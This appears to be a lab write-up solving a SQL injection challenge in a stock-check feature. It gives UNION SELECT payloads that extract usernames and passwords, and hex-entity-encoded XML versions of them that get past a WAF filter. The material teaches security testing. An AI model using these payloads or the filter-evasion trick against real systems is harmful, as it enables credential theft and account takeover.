
## Description:

this lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tbles

the database contains a 'users' table, which contains credentials of registered users

to solve the lab perform a SQL inection to retrieve the admin user's credentials then log in to their account

## Solution:

trying standard sql injection payloads in the 'productId' and 'storeId' parameters will fail as they will be flagged as an inection attemp, so using XML entities to bypass the WAF is the way to solve the lab

Burp Decoder with option "Encode as HTML" can be used to generate a payload 

```sql
UNION SELECT username FROM users \\ returns carlos,administrator,wiener
```

```xml
<storeId>
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
</storeId>
```
<br>


```sql
UNION SELECT password FROM users WHERE username='administrator' \\ returns the password of the administrator user
```
```xml
<storeID>
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;
</storeID>
```
<br>
also possible to query for username and password at the same time by using the concatenation operator

```sql
1 UNION SELECT username||':'||password FROM users
```

```xml
<storeId>
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x3a;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
</storeId>
```